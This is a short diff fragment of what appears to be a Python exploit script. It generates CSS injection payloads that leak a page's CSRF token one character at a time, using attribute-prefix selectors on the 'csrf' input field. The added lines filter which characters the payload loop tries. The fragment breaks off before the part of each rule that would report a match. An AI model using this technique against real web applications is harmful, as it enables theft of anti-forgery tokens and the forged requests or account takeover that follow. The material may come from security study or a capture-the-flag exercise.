@@ -4,6 +4,11 @@ prefix = "ruW"
 css = ""
 
 for c in string.printable:
+    if c == '"' or c == "\\":
+        continue
+    if c == "\t":
+        break
+
     payload = f"{prefix}{c}"
     css += f"""
 input[name="csrf"][value^="{payload}"] {{
